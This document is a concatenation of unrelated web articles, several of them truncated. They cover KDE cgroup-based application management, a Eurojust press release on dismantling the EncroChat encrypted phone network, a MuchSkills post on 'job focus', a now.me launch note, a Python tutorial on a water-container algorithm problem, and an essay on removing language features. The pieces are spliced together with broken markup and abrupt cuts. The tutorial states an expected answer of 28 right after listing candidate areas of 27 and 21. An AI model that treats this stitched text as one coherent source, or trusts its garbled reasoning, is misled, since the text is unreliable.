<li>Set limits so that a CPU can't use more than N% </li>
<li>We can gracefully close processes on logout</li>
<li>We can disable networking</li>
<li>We can set memory limits</li>
<li>We can prevent forkbombs</li>
<li>We can provide hints to the OOM killer not just with a weight but with expected ranges that should be considered normal</li>
<li>We can freeze groups of processes (which will be useful for Plasma mobile)<br>
... </li>
</ul>
<p>All of this is easy to add for a user / system administrator. Using drop in's one can just add a .service file [example file link] to ~/.config/systemd/user.control/app-firefox@.service and manipulate any of these.</p>
<p>[caveat, some of those features works for applications created as new transient services, not the lite version using scopes that's currently merged in KDE/Gnome - maybe worth mentioning]</p>

<p>Plasma 5.19 and recent Gnome now spawn applications into respective cgroups, but we're not yet surfacing the results that we can get from this.</p>
<p>For the KDE devs providing the metadata is easy.</p>
<p>If spawning a new application from an existing application be sure to use either <a href="https://api.kde.org/frameworks/kio/html/classKIO_1_1ApplicationLauncherJob.html"><code>ApplicationLauncherJob</code></a> or <a href="https://api.kde.org/frameworks/kio/html/classKIO_1_1CommandLauncherJob.html"><code>CommandLauncherJob</code></a> and set the respective service. Everything else is then handled automagically. You should be using these classes anyway for spawning new services.</p>
<p>For users, you can spawn an application with either <code><code>kstart5 --application foo.desktop"</code></code></p>
<p>That change to the launching is relatively tiny, but getting to this point in Plasma wasn't easy - there were a lot of edge cases that messed up the grouping correctly.</p>
<ul>
<li>kinit, our zygote process really meddled with keeping things grouped correctly</li>
<li>drkonqi, our crash handler and application restarter</li>
<li>dbus activation has no knowledge of the associated .desktop file if an application is DBus activated (such as spectacle our screenshot tool)</li>
<li>and many many more papercuts throughout of different launches</li>
</ul>
<p>Also to fully capitalise on slices we need to move all our background processes into managed services and slices. This is worthy of another (equally lengthy) blog post.</p>
<h2>How you can help?</h2>
<p>It's been a battle to find these edge cases.<br>
Whilst running your system, please run systemd-cgls and point out any applications (not background services yet) that are not in their appropriate cgroup.</p>

<p>(e.g BSD users)</p>
<p>As we're just adding metadata, everything used now will continue to work exactly as it does now. All existing tools work exactly the same. Within our task manager we still will keep a process view (it's still useful regardless) and we won't put in any code that relies on the cgroup metadata present. We'll keep the existing heuristics for matching windows with external events, cgroup metadata would just be a strongly influence factor in that. Things won't get worse, but we won't be able to capitalise on the new features discussed here, </p>

<p><img src="http://www.eurojust.europa.eu/press/PressReleases/PublishingImages/2020-07-02_PR.jpg" alt=""></p><p><span>The Hague, 2 July 2020</span></p>


<p><strong>At a joint press conference today, French and Dutch law enforcement and judicial authorities, Europol and Eurojust presented the impressive results of a joint investigation team to dismantle EncroChat, an encrypted phone network widely used by criminal networks. </strong></p>
<p><strong>Over the last months, the joint investigation made it possible to intercept, share and analyse millions of messages that were exchanged between criminals to plan serious crimes. For an important part, these messages were read by law enforcement in real time, over the shoulder of the unsuspecting senders. </strong></p>
<p><strong>The information has already been relevant in a large number of ongoing criminal investigations, resulting in the disruption of criminal activities including violent attacks, corruption, attempted murders and large-scale drug transports. Certain messages indicated plans to commit imminent violent crimes and triggered immediate action. The information will be further analysed as a source of unique insight, giving access to unprecedented volumes of new evidence to profoundly tackle organised criminal networks.  </strong></p>

<p>In recent years, European countries have been increasingly affected by organised crime groups who are pervasive and highly adaptive, posing one of the most pressing security challenges faced by law enforcement and judicial authorities. In this regard, the abuse of the encrypted communication technologies is a key facilitator of their criminal activities.</p>
 

<p>Since 2017, the French <em>Gendarmerie </em>and judicial authorities have been investigating phones that used the secured communication tool EncroChat, after discovering that the phones were regularly found in operations against organised crime groups and that the company was operating from servers in France. Eventually, it was possible to put a technical device in place to go beyond the encryption technique and have access to the users' correspondence.</p>

<p>In early 2020, EncroChat was one of the largest providers of encrypted digital communication with a very high share of users presumably engaged in criminal activity. User hotspots were particularly present in source and destination countries for cocaine and cannabis trade, as well as in money laundering centres.</p>
 

<p><a href="http://www.eurojust.europa.eu/doclibrary/corporate/Infographics/The%20dismantling%20of%20an%20encrypted%20phone%20solution%20used%20by%20organised%20crime%20groups%2c%202020/2020-07_Infographic-Encrochat-Case.pdf" target="_blank"><img src="http://www.eurojust.europa.eu/press/PressReleases/PublishingImages/2020-07-02_PR-infographic-thumbnail.png" alt=""></a>Given the widespread use of the encrypted telephone solution by EncroChat among international criminal networks around the world, French authorities decided to open a case at Eurojust, the EU Agency for Criminal Justice Cooperation, towards the Netherlands in 2019. Further developments in the investigations led to organising the processing of the data, which was captured on the basis of the provisions of French law and with judicial authorisation, through the frameworks for international judicial and law enforcement cooperation. [<em>Click on image to enlarge</em>].</p>

<p>The data was in first instance shared with the Netherlands. Eurojust facilitated the creation of a joint investigation team (JIT) between the two countries and with the participation of Europol, the European Union Agency for Law Enforcement Cooperation, in April 2020. </p>

<p>Europol has been actively involved in the investigations led by France and the Netherlands since 2018, relating to the provision and use of encrypted communication services by organised crime groups. Through its role as an information hub and its extensive analytical and technical support system, Europol was able to create and provide a unique and global insight on the scale and functioning of organised crime, as a result of this investigation. This will help law enforcement to combat organised crime in the future more successfully. Europol’s support from the early stages of this JIT included: promoting and arranging international cooperation, providing extensive analytical and financial support, technical expertise and a secured platform for the exchange of information between the countries involved.  A large dedicated team at Europol investigated in real time millions of messages and data that it received from the JIT partners during the investigation, cross-checked and analysed the data, and provided and coordinated with the JIT partners the information exchange to concerned countries.</p>

<p><img src="http://www.eurojust.europa.eu/press/PressReleases/PublishingImages/2020-07-02_PR_GendarmerieNationale.jpg" alt="">A large number of suspects have also been arrested in several countries which were not participating in the JIT but particularly affected by the illegal use of these phones by individuals active in organised crime, including in the UK, Sweden and Norway. Many of these investigations were connected with international drug trafficking and violent criminal activities.</p>

<p>At the same time, numerous operational meetings for the daily coordination between the law enforcement entities of the JIT partners and other countries took place at Europol, partly during COVID-19.</p>

<p>Eurojust intensively facilitated the judicial cooperation, during the extensive use of European judicial cooperation instruments such as European Investigation Orders. Throughout the investigation, the JIT members organised five coordination meetings at Eurojust to bring all involved parties together in a secure environment, identify parallel or linked investigations, decide on the most suitable framework for cooperation and solve potential conflicts of jurisdiction.  </p>

<p>In France, where the operation takes place under the code name "Emma 95", the Gendarmerie has set-up a Taskforce since March 2020. With more than 60 officers, the Gendarmerie leads the investigations targeting the EncroChat encrypted telephone solution under the supervision of the magistrates of the JIRS of Lille. The Taskforce has been monitoring the communications of thousands of criminals, leading to the opening of a wide range of incidental proceedings. France does not wish to communicate further on these on-going investigations nor on the results obtained. The considerable resources deployed demonstrate the importance of these investigations and the importance attached to their success in France. </p>

<p>In the Netherlands, where the operation went under the code name “Lemont”, hundreds of investigators have, with authorisation of the examining magistrate, followed the communications of thousands of criminals day and night since the operation began to unravel and act on the intercepted data stream. The criminal investigation has been led by prosecutors from the Dutch National Public Prosecution Service and the information has been made available to about a hundred ongoing criminal investigations. The investigation has so far led to the arrest of 60 suspects, the seizure of drugs (more than 10 000 kilo cocaine, 70 kilo heroin, 12 000 kilo cannabis, 1 500 kilo crystal meth and 160 000 liter of a substance used to produce synthetic drugs), the dismantling of 19 synthetic drugs labs, the seizure of dozens of (automatic) fire weapons, expensive watches and 25 cars, including vehicles with hidden compartments, and almost EUR 20 million in cash. The expectation is that information will be made available in more than 300 investigations. In a number of cases, more arrests are very likely to follow in the coming period. </p>

<p>The interception of EncroChat messages came to an end on 13 June 2020, when the company realised that a public authority had penetrated the platform. EncroChat then sent a warning to all its users with the advice to immediately throw away the phones.</p>
 

<p>While the activities on EncroChat have been stopped, this complex operation shows the global scope of serious and organised crime and the connectivity of criminal networks who use advanced technologies to cooperate on a national and international level. The effects of the operation will continue to echo in criminal circles for many years to come, as the information has been provided to hundreds of ongoing investigations and, at the same time, is triggering a very large number of new criminal investigations of organised crime across the European continent and beyond. </p>

<p><strong>What is EncroChat?</strong></p>

 
<p><img src="http://www.eurojust.europa.eu/press/PressReleases/PublishingImages/2020-07-02_encrochat.png" alt="">EncroChat phones were presented to customers as guaranteeing perfect anonymity (no device or SIM card association on the customer's account, acquisition under conditions guaranteeing the absence of traceability) and perfect discretion both of the encrypted interface (dual operating system, the encrypted interface being hidden so as not to be detectable) and the terminal itself (removal of the camera, microphone, GPS and USB port). It also had functions intended to ensure the ‘impunity’ of users (automatic deletion of messages on the terminals of their recipients, specific PIN code intended for the immediate deletion of all data on the device, deletion of all data in the event of consecutive entries of a wrong password), functions that apparently were specially developed to make it possible to quickly erase compromising messages, for example at the time of arrest by the police. In addition, the device could be erased from a distance by the reseller/helpdesk.</p>

<p>EncroChat sold the cryptotelephones (at a cost of around EUR 1 000 each) at international scale and offered subscriptions with a worldwide coverage, at a cost of 1 500 EUR for a six-month period, with 24/7 support.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Some MuchSkills users must be wondering why we ask them to list their ‘job focus’ instead of ‘job title’. I’ve also been asked to define what we mean by ‘job focus’ by some of you, so I thought it might be good to explain what we mean by the concept here.</p><p>We wanted a term that helped us convey two things about ourselves to others:</p><ul role="list"><li>The skills we are proficient in.</li><li>The skills we are keen on using – those that energise us.</li></ul><p>The term ‘job title’ didn’t work for us for two reasons. One, it doesn’t tell us much about the skills people actually use during their work or about a person’s interest in deploying those skills. Two, we felt job titles were a throwback to an old order where titles were used as currency, indicating a person’s status in the hierarchy, and we believe modern egalitarian and collaborative workplaces don’t really need such hierarchies.</p><p>That inspired us to coin the term ‘job focus’.</p><p>At MuchSkills, we’d like to define ‘job focus’ as<strong>:</strong><em> “The value we bring to our colleagues and workplaces that is connected to our personal interests, values and competences.”</em></p><p>To record your ‘job focus’ on MuchSkills, you must answer these two simple questions: What is it that I’m good at? What is it that energizes me?</p><p>Let’s use my ‘job focus’ as an example.</p><p>It reads: Digital Strategy &gt; Business Strategy &gt; Digital Transformation &gt; User Experience Design &gt; UI Design &gt; Storytelling &gt; Design Thinking &gt; Sales.&nbsp;</p><p>These skills are arranged in order of importance – from top to bottom. The MuchSkills interface allows you to do this by increasing or decreasing the sizes of each bubble.</p><figure id="w-node-f7a825d2da2c-ba81df3a"><p><img src="https://uploads-ssl.webflow.com/5dc27bf865f41cedb4b7b9a5/5ef35e2952537cab4fe9f40a_MuchSkillls%20-%20Noel.png" alt="Noel Braganza on MuchSkills - Job Focus, Soft Skills, Technical Skills profile"></p></figure><p>On the other hand, my job title is: Digital Product Designer. This title doesn’t tell you that there are so many other skills I am proficient in and enjoy working with.&nbsp;&nbsp;</p><p>It’s the same story with so many other job titles.</p><p>Do remember that the emphasis of ‘job focus’ is on both “proficiency” <em>and</em> “interest”. If you are good at a particular skill, but aren’t really keen on using it now or in the future, you shouldn’t list it under ‘job focus’.</p><p>Before I entered the world of Digital Product Design, for instance, I was a copywriter and happened to be a good one too. Today if I ask myself what I am proficient in, one of the answers will be ‘copywriting’. But copywriting isn’t what interests or energises me today. It is not something I want to work with in the future. So I do not list it under ‘job focus’.</p><p><strong>The secret to staying engaged at work</strong></p><p>In my opinion, ‘job focus’ tells people – whether colleagues or hiring managers – way more about us and our capabilities than a CV or ‘job title’ can.</p><p>We believe this is important knowledge for hiring managers or team managers because when employees put their ‘job focus’ out there so that everyone can see the strengths they enjoy using at work, employers can use that information to match them with the right projects.</p><p>Why is this important?</p><p>Three words:<a href="https://www.muchskills.com/blog/are-engaged-employees-more-productive"> Increased employee performance</a>.</p><p>A<a href="http://selfdeterminationtheory.org/wp-content/uploads/2017/03/2014_Dubreuil_etal_JofPosPsych.pdf"> 2014 study</a> published in <em>The Journal of Positive Psychology</em> validated the association between the use of an individual’s strengths and work performance. “…[E]ncouraging strengths identification, use, and development in human management practices can be an excellent way to promote work performance, thereby stimulating passion, vitality, and concentration at work,” the study concluded.</p><p>Gallup’s<a href="https://www.gallup.com/workplace/238085/state-american-workplace-report-2017.aspx"> <em>State of the American Workplace</em></a> report published in 2017 also found that workers want roles and employers that allow them to make the most of their strengths. “Employees do their best in roles that enable them to integrate their talent (the natural capacity for excellence), skills (what they can do) and knowledge (what they know),” it said.</p><p>That’s not all.</p><p>The ‘job focus’ concept acknowledges that skills and interests change over time. There may be times when you upskill or find you are interested in developing an existing or new skill. The MuchSkills ‘job focus’ tab allows you to capture that by enabling you to increase or decrease the size of the bubble with that particular skill. All this is instantly visible to colleagues, managers and even recruiters (if you make your profile public).</p><p>So go ahead and list your ‘job focus’ now.<br></p></div></div>]]>

<p><img src="https://team.video/uploads/now.jpg" alt=""></p>
<p>Today we are excited to share <a href="https://now.me/">now.me</a> -- a way to get right to the meeting you're supposed to be in right now.  At any given moment, if you visit the site, it will look at your calendar, see what video call you're meant to be in, and take you right there.  It works with most video call providers, including Zoom, Google Meet, Whereby, team.video, and others.  We have been using this tool internally for a while now, and thought we might as well share it with the world.</p>
<p>In a way it seems like a small problem to solve.  It's not so hard to open up your calendar, find the meeting you're supposed to be in, find the link to it, and open it up.  But at that moment when it's time to get together with your clients or colleagues, that time is precious. We want those brain cycles in to go toward preparing for the conversation that is about to take place.  Especially if we're running late, or if we're trying to get together materials to share, or deep in thought pondering whatever trade-offs we are about to weigh -- it can make a big difference not to have to context-switch at that moment.</p>
<p>As we use now.me, we find ourselves dreaming of next iterations: Beautiful as it is in its current state, it could be nice to add support for custom themes where we could set our own images, or toggle dark mode.  Another idea we've pondered is an option to keep a now.me tab open, and then when a meeting is about to start, it would show a notification and even automatically join the meeting in a new tab, with no interaction required.</p>
<p>We'd love to hear your feedback!  Try it out at <a href="https://now.me/">https://now.me</a></p>

July 2, 2020 | http://codingismycraft.com/index.php/2020/07/02/thinking-about-algorithmic-problems/ | <a href="https://web.archive.org/web/*/http://codingismycraft.com/index.php/2020/07/02/thinking-about-algorithmic-problems/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In this posting we will discuss <strong>algorithmic thinking</strong> and try to propose a way of thinking that might become helpful when trying to solve a problem that does not have an obvious solution and some level of <strong>improvisation</strong> is required.</p>
<p>Based on my experience the three most important qualities of a programmer can be summarized as follows:</p>
<ul>
<li>Algorithmic thinking.</li>
<li>Code design.</li>
<li>Mastery of the language of choice.</li>
</ul>
<p>The ability to solve problems that require the <strong>invention</strong> of a new algorithm combined with the skill of recognizing cases that can be solved directly by a “standard” one is one of the strongest signs of programming expertise and talent.</p>
<p>Although it is true that the need to create a brand new algorithm does not appear often in our days, it is also equally true that a programmer who has the ability to successfully <strong>combine analytic and synthetic thinking</strong> and efficiently solve a multi-dimensional problem will probably be proven to be more effective than somebody who does not.</p>
<p>Out of the three types of skills that I am mentioning above the one that requires the most <strong>programming talent</strong> is without a doubt the <strong>Algorithmic thinking</strong>; the most successful software companies are convinced about the the truth of this statement and this is why algorithms lie in the core of their interviewing processes.</p>
<p>Although talent is definitely required in most cases it is not enough when facing a new problem; we can certainly be assisted by some “methodical” steps that can serve as the blueprint for the creation of a solution and discussing them is the topic of this posting.</p>
<p>A summary of these “methodical” steps that I am usually following whenever I have to deal with an original problem is the following:</p>
<ul>
<li>Articulate the problem with clarity and try to understand niche cases.</li>
<li>Creating several sets of testing input – output</li>
<li>Code at least one brutal force solution</li>
<li>Study the problem trying to understand it in depth.</li>
<li>Decide if an existing algorithm can solve it directly or a special “trick” is needed;</li>
<li>Can one of the standard methodologies like graph, recursion, dynamic programming or data structures can be used?</li>
</ul>
<p>I will now pick a simple algorithmic problem and try to explain the thought process to solve it.</p>
<h2>The problem</h2>
<p>This is a well known problem that can be found in several websites that specialize on preparing candidates for programming positions.<br>
Assume a water tank which has multiple parallel movable divisors placed in different locations as can be seen in the following picture:</p>

<p><img src="http://i1.wp.com/codingismycraft.com/wp-content/uploads/2020/07/tank.gif?resize=490%2C330" alt="tank" data-recalc-dims="1"></p>

<p>To better understand the picture you have to think that its third dimension is omitted; the blue bars represent the divisors that can be removed. Each divisor is set in a specific distance that cannot change.</p>
<p>The objective is to discover the two divisors that can hold the most water when others will be removed.</p>
<h2>First thoughts</h2>
<p>Now that we have the problem clearly defined, lets pause for a second and try to put together a trivial solution which will solve it without considering its performance.</p>
<p>The fact that we are looking for a <b>pair </b>of divisors makes it obvious that if find all the divisor pairs and calculate the covering areas for each of them and simply select the largest one (we do not need to consider the third dimension since it will be the same for all the pairs.</p>
<p>Before we do any coding and using the picture above we can create the testing data to check our brutal solution and verify it.</p>
<p>Eyeballing the picture we immediately see that there are two candidate solution:</p>
<p>The 1 – 10 pair results to 3 X 9 = 27 while the 3 – 6 pair to 7 X 3 = 21 <strong>so the expected solution will be 28.</strong></p>
<h2>Describe the problem programmatically</h2>
<p>At this point it makes sense to try to describe the problem in a programming language (for this example we will use python).</p>
<p>The first thing that comes to mind is to represent the water tank programmatically. We can start by introducing a class to hold the coordinates of the upper point of each location:</p>
<pre title="">import collections
Point = collections.namedtuple("Point", ['x', 'y'])
</pre>
<p>Now using Point we can represent the tank as follows:</p>
<pre title="">tank = [Point(1, 3), Point(3, 9), Point(6, 7), Point(10, 4)]
</pre>
<p>Also we can declare the function to calculate the max_area:</p>
<pre title="">def get_max_area(points):
    pass
</pre>
<p>Since we already have calculated the expected answer we can add an assertion to validate our solution:</p>
<pre title="">assert get_max_area(tank) == 28
</pre>
<p>At this point our code should look as follows:</p>
<pre title="">import collections
Point = collections.namedtuple("Point", ['x', 'y'])

tank = [Point(1, 3), Point(3, 9), Point(6, 7), Point(10, 4)]

def get_max_area(tank):
    pass

assert get_max_area(tank) == 28
</pre>
<p>If we run the program we should see the following output:</p>
<p><img src="http://i2.wp.com/codingismycraft.com/wp-content/uploads/2020/07/tank-1.gif?resize=678%2C109" alt="tank-1" data-recalc-dims="1"></p>
<h2>A Brutal solution</h2>
<p>Assuming that we are having a pair of Points (representing two divisors) its covered area can be found if we multiply its width by the lower divisor:</p>
<p><img src="http://i1.wp.com/codingismycraft.com/wp-content/uploads/2020/07/tank-2.gif?resize=486%2C328" alt="tank-2" data-recalc-dims="1"></p>
<p>In this example the area will be covered by a 7 X 3 rectangle; 7 is the height of the lower divisor while 3 is the distance between them.</p>
<p>To simplify our solution, we can define a function which will receive two divisors as Points and return the enclosed area:</p>
<pre title="">def get_area(p1, p2):
    width = p2.x - p1.x if p2.x &gt; p1.x else p1.x - p2.x
    height = min(p2.y,  p1.y)

    return width * height
</pre>
<p>Now we are ready to implement the brutal solution. We should simply create all possible pairs of divisors, calculate the area for each of them and return the maximum value:</p>
<pre title="">import collections
import itertools

Point = collections.namedtuple("Point", ['x', 'y'])

tank = [Point(1, 3), Point(3, 9), Point(6, 7), Point(10, 4)]

def get_area(p1, p2):
    width = p2.x - p1.x if p2.x &gt; p1.x else p1.x - p2.x
    height = min(p2.y,  p1.y)

    return width * height


def get_max_area(tank):
    max_area = 0
    for p1, p2 in itertools.combinations(tank, 2):
        max_area = max(max_area, get_area(p2, p1))
    return max_area


assert get_max_area(tank) == 28
</pre>
<p>If we run the program above we will see that it completes without an error so our thought process was correct.</p>
<h2>The problem with the brutal solution</h2>
<p>Our brutal solution appears to be correct, so now let’s see how it scales. Let’s go ahead and stress test it by creating a tank that consists of a large number of points and see how it behaves. To do so we need to write a function to generate random points and call our get_max_area with increasing number of divisors:</p>
<pre title="">import collections
import itertools
import random
import timeit
import functools

Point = collections.namedtuple("Point", ['x', 'y'])


def get_area(p1, p2):
    width = p2.x - p1.x if p2.x &gt; p1.x else p1.x - p2.x
    height = min(p2.y, p1.y)

    return width * height


def random_points(count, max_height):
    for x in random.sample(range(1, count * 10), count):
        y = random.randint(1, max_height)
        yield Point(x, y)


def get_max_area(tank):
    max_area = 0
    for p1, p2 in itertools.combinations(tank, 2):
        max_area = max(max_area, get_area(p2, p1))
    return max_area


for count in [100, 1000, 5000, 10000]:
    tank = list(random_points(count=count, max_height=12))
    print(
        'count:', count, 'duration:',
        timeit.timeit(stmt=functools.partial(get_max_area, tank), number=1)
    )

</pre>
<p>So, running the above program resulted on the following output on my computer:</p>
<p><img src="http://i0.wp.com/codingismycraft.com/wp-content/uploads/2020/07/tank-3.gif?resize=599%2C132" alt="tank-3" data-recalc-dims="1"></p>
<p>As you can see although our solution works fast enough when the number of divisors is low it grows very fast and when we are trying 10,000 of them it takes more than 41 seconds!</p>
<p>The poor performance is caused from the fact that we are calculating the area for all the possible pairs.</p>
<p>We now that the possible combination of n things by k are given by the following formula:</p>
<p><img src="http://i2.wp.com/codingismycraft.com/wp-content/uploads/2020/07/CodeCogsEqn.gif?resize=169%2C44" alt="CodeCogsEqn" data-recalc-dims="1"></p>
<p>So assuming we have 10,000 divisors, the possible pairs will be:</p>
<p><img src="http://i1.wp.com/codingismycraft.com/wp-content/uploads/2020/07/combos.gif?resize=161%2C44" alt="combos" data-recalc-dims="1"></p>
<p>which equals 49,995,000 or in other words it has a time complexity of O(C(n,k)) which results into an extremely slow solution.</p>
<p>At this point we must revisit our problem and think if we can come up with a “smart trick” that will allow us to improve our solution.. Please pause for a while and think our problem again trying to detect if there is something that will allow us to bypass most of the calculations of the brutal solution and then move on to the explanation of the efficient solution..</p>
<h2>The trick</h2>
<p>Lets revisit our original example and try to go step by step to an efficient solution. This time we will start by calculating the area of the first and last point as can be seen in the following picture:</p>
<p><img src="http://i1.wp.com/codingismycraft.com/wp-content/uploads/2020/07/tank-4.gif?resize=461%2C308" alt="tank-4" data-recalc-dims="1"></p>
<p>The area between the first and the last point is: <strong>3 X (10 – 1) = 27</strong>.</p>
<p>Note that we use the point with the lower height and multiply it by the distance.</p>
<p>The trick arises is exactly here.</p>
<p>Note that for obvious the point with the lower height is impossible to result to a larger area when combined with any other point. This means that once we have calculated the first – last area in our example we can simply get rid of the first point without having to deal with it anymore.</p>
<p>This is a great improvement over the brutal solution since for it each point (including the first) has to be paired with all the others. In our example this means that for the brutal solution the first point is matched against all the three others but as we can see we do not need to do so since it is impossible to find a larger area anywhere else except the last point.</p>
<p>Following our observation, we keep the calculated area (27) remove the first point and continue to the next point as can be seen here:</p>
<p><img src="http://i0.wp.com/codingismycraft.com/wp-content/uploads/2020/07/tank-5.gif?resize=455%2C305" alt="tank-5" data-recalc-dims="1"></p>
<p>Note that now the last point is lower that the first; the enclosed area is <strong>4 X (10 – 3) = 28</strong> which replaces the previous maximum area value (was 27). Thinking in the same way we remove the last point and now our problem looks as follows:</p>
<p><img src="http://i2.wp.com/codingismycraft.com/wp-content/uploads/2020/07/tank-6.gif?resize=453%2C310" alt="tank-6" data-recalc-dims="1"></p>
<p>Now the enclosed area in <strong>7 X (6 -3) = 21</strong> which is less that the previous maximum area which remains 28 while we remove the lower Point and remain with a single point meaning that our problem is over and we have found the solution which is 28.</p>
<h2>The efficient solution</h2>
<p>Now that we have found the <strong>trick</strong> our next step is to re-write our get_max_area …</p></div></div>

    <em>Many languages have redundant features; progress in language design includes removing those features.</em>
  </p>
  <p>
    (This post is also <a href="http://postd.cc/less-is-more">available in Japanese</a>.)
  </p>
  <p>
    There are many programming languages, and new ones are being introduced all the time. Are these languages better than previous languages? Obviously, that's impossible to answer, since there's no clear measurement of what constitutes a 'better' programming language.
  </p>
  <p>
    Still, if you look at a historical trend, it looks as though one way to make a better language is to identify a redundant language feature, and design a new language that doesn't have that feature.
  </p>
  <blockquote>
      "perfection is attained not when there is nothing more to add, but when there is nothing more to remove."
      - Antoine de Saint Exupéry
    </blockquote>
  
  <p>
    In this article, you'll see various examples of language features that have already proven to be redundant, and other features where we are seeing strong indications that they are redundant.

    When the first computers were created, programs had to be written in machine code or assembly language. In machine code, you can express everything the CPU can do, because the machine code is written it terms of a CPU's instruction set. While it's possible to write correct programs in machine code, you can also write a lot of incorrect programs, including programs that crash horribly, or perhaps even destroy the machine on which they are running.
  </p>
  <p>
    You're most likely used to writing code in a higher-level language, but even so, if you share my experience with this, you'll agree that it takes a lot of trial and error to get things right. For every correct program, there are many incorrect variations. The set of incorrect programs is much bigger than the set of correct programs.
  </p>
  <p>
    With machine code, you have limitless ways to create incorrect programs. Yes: you can express everything the CPU can execute, but most of it will be incorrect. Thus, the set of valid programs is a small subset of the set of all possible instructions.
  </p>

    Early computer programmers quickly discovered that writing in machine code was extremely error-prone, and the code was also as unreadable as it could be. One way to address this problem was to introduce assembly language, but it didn't solve the underlying problems: most assembly languages were just 'human-readable' one-to-one mappings over machine code, so you still have unlimited ways to express incorrect programs.

  <p>
    After having suffered with machine code and assembly language for some time, programmers figured out how to express programs in high-level languages. The first programming languages aren't in much use today, but a good example of a 'low-level' high-level language still in use today is C.

  </p>
  <p>
    In C, you can express almost all valid programs. There are still tons of ways to write incorrect programs that will crash the program (or the computer), but since the language is an abstraction over machine code, there are instructions you can't express. Most of these are invalid instruction sequences anyway, so it's for the better.
  </p>
  <p>
    Notice what happened: moving from machine code to a high-level programming language removes a feature of the language. In machine code, you can express <em>anything</em>; in a high-level language, there are things you can't express. You're okay with that, because the options that were taken away from you were bad for you.

    In 1968, Edsger Dijkstra published his (in)famous paper <em>Go To Statement Considered Harmful</em>. In it, he argued that the GOTO statement was an bad idea, and that programs would be 'better' without the GOTO statement. This sparked a decade-long controversy, but these days we've come to understand that Dijkstra was right. Some of the most popular languages in use today (e.g. Java and JavaScript) don't have GOTO at all.

  </p>
  <p>
    Since GOTO has turned out to be an entirely redundant language feature, a language without it doesn't limit your ability to express <em>valid</em> programs, but it does limit your ability to express <em>invalid</em> programs.
  </p>
  <p>
    Do you notice a pattern?
  </p>
  <p>
    Take something away, and make an improvement.

  <p>
    There's nothing new about this; <a href="https://skillsmatter.com/skillscasts/2323-bobs-last-language">Robert C. Martin told us that years ago</a>.
  </p>
  <p>
    You can't just arbitrarily take away <em>anything</em>, because that may constrain you in such a way that there are valid programs you can no longer write:

  <p>
    Today, everyone seems to agree that errors should be handled via some sort of exception mechanisms; at least, everyone can agree that <em>error codes</em> are <em>not</em> the way to go (and I agree). We need something richer than error codes, and something that balances usefulness with robustness.
  </p>
  <p>
    The problem with exceptions is that this mechanism is really only <a href="http://c2.com/cgi/wiki?DontUseExceptionsForFlowControl">GOTO statements in disguise</a> - and we've already learned that GOTO is considered harmful.
  </p>
  <p>
    A better approach is to use a <a href="http://en.wikipedia.org/wiki/Tagged_union">sum type</a> to indicate <em>either</em> <a href="http://fsharpforfunandprofit.com/posts/recipe-part2">success or failure in a composable form</a>.

    As Robert C. Martin also pointed out, in older languages, including C and C++, you can manipulate pointers, but as soon as you introduce polymorphism, you no longer need 'raw' pointers. Java doesn't have pointers; JavaScript doesn't do pointers; C# <em>does</em> allow you to use pointers, but I've personally never needed them outside of interop with the Windows API.
  </p>
  <p>
    As these languages have demonstrated, you don't need access to pointers in order to be able to pass values by reference. Pointers can be abstracted away.

    Most strongly typed languages give you an opportunity to choose between various different number types: bytes, 16-bit integers, 32-bit integers, 32-bit <em>unsigned</em> integers, single precision floating point numbers, etc. That made sense in the 1950s, but is rarely important these days; we waste time worrying about the micro-optimization it is to pick the right number type, while we lose sight of the bigger picture. As <a href="http://hanselminutes.com/396/bugs-considered-harmful-with-douglas-crockford">Douglas Crockford explains, in JavaScript there's only a <em>single</em> number type, which is a great idea - just too bad it's the wrong single number type</a>.

  </p>
  <p>
    With the modern computer resources we have today, a programming language that would restrict you to a single, sane number type would be superior to the mess we have today.

    Null pointers <a href="#7874496bf5134a66ae5a6350cbb6c04f" title="permalink">#</a>
  </h3>
  <p>
    Nulls are one of the most misunderstood language constructs. There's nothing wrong with the concept of a value that may or may not be present. Many great programming languages have this concept. In Haskell, it's called <em>Maybe</em>; in F#, it's called <em>option</em>; in T-SQL it's called <em>null</em>. What's common in all these languages is that it's an <em>opt-in</em> language feature: you can declare a value as being 'nullable', but by default, <em>it isn't</em> (nullable).
  </p>
  <p>
    However, due to <a href="http://www.infoq.com/presentations/Null-References-The-Billion-Dollar-Mistake-Tony-Hoare">Tony Hoare's self-admitted billion-dollar mistake</a>, mainstream languages have null pointers: C, C++, Java, C#. The problem isn't the <em>concept</em> of 'null', but rather that everything <em>can</em> be null, which makes it impossible to distinguish between the cases where null is an appropriate and expected value, from the cases where null is a defect.
  </p>
  <p>
    Design a language without null pointers, and you take away the ability to produce null pointer exceptions.
  </p>  
  <p>
    <img src="https://blog.ploeh.dk/content/binary/less-is-more-language-features-figure-06.png" alt="The set of all valid programs, inside the much larger set of all possible instructions, with the overlay of a language without null pointers.">
  </p>
  <p>
    If Tony Hoare is correct that null pointers cost billions of dollars in the last few decades, getting rid of that source of defects can save you lots of money. From Turing-complete languages like T-SQL, Haskell, and F# we know that you can express all valid programs without null pointers, while a huge source of defects is removed.

    Mutation <a href="#68650468d124404aacaa4916a8b2a51a" title="permalink">#</a>
  </h3>
  <p>
    A central concept in Procedural, Imperative, and Object-Oriented languages is that you can change the value of a variable while executing your program. That's the reason it's called a <em>variable</em>. This seems intuitive, since a CPU contains registers, and what you actually do when you execute a program is that you move values in and out of those registers. It's also intuitive because the purpose of most programs is to change the state of the world: Store a record in a database. Send an email. Repaint the screen. Print a document. Etc.
  </p>
  <p>
    However, it turns out that mutation is also a large source of defects in software, because it makes it much harder to reason about code. Consider a line of C# code like this:
  </p>
  <pre><span>var</span>&nbsp;r&nbsp;=&nbsp;<span>this</span>.mapper.Map(rendition);</pre>
  
  <p>
    When the <code>Map</code> method returns, has <code>rendition</code> been modified? Well, if you follow <a href="http://en.wikipedia.org/wiki/Command%E2%80%93query_separation">Command Query Separation</a>, it shouldn't, but the only way you can be sure is to review the implementation of the Map method. What if that method exhibits the same problem, by calling into other methods that <em>could</em> mutate the state of the application? There's nothing in C# (or Java, or JavaScript, etc.) that prevents this from happening.
  </p>
  <p>
    In a complicated program with a big call stack, it's impossible to reason about the code, because <em>everything</em> could mutate, and once you have tens or hundreds of variables in play, you can no longer keep track of them. Did the <code>isDirty</code> flag change? Where? What about the <code>customerStatus</code>?
  </p>
  <p>
    Imagine taking away the ability to mutate state:
  </p>
  <p>
